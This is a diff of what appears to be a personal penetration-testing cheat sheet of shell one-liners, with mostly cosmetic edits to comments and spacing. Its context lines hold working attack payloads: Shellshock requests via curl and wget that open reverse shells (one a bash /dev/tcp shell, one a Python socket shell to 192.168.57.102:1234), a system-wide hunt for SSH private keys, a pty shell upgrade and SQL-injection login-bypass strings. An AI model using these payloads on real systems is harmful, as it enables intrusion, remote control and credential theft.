@@ -28,13 +28,13 @@ lsof +L1
 # get information about procceses with open ports
 lsof -i
 
-# look at all accounts including AD
+# look at all accounts 
 getent passwd
 
-# look at all groups and membership including AD
+# look at all groups and memberships
 getent group
 
-# list crontabs for all users including AD
+# list crontabs for all users 
 for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done
 
 # generate random passwords
@@ -94,11 +94,12 @@ find /var/log -name *.log -type f -exec ls -la {} \; 2>/dev/null
 find /var/log -type f -exec ls -la {} \; 2>/dev/null
 
 # find ssh keys/host information
-find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r ls -la
+find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys"      2>/dev/null |xargs -r ls -la
 
 
 # pty shell
 python -c 'import pty;pty.spawn("/bin/bash")'
+
 
 
 # python\ruby\php HTTP servers
@@ -112,6 +113,7 @@ php -S 0.0.0.0:8888
 # shell-shock bash reverse 
 
 curl -H "User-agent: () { :; }; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http://<target>/cgi-bin/admin.cgi -v
+
 
 # moar shellshock 
 
@@ -139,8 +141,8 @@ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/ca
 wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.57.102\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>&1" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status
 
 
-# check whats in the the title tag of website
 
+# check whats in the the title tag of website
 curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
 
 
@@ -597,7 +599,7 @@ Once the required values are completed the following command will execute your h
 
 
 
-#auth bypass 
+#auth bypass stuff
 
 or 1=1
 or 1=1--
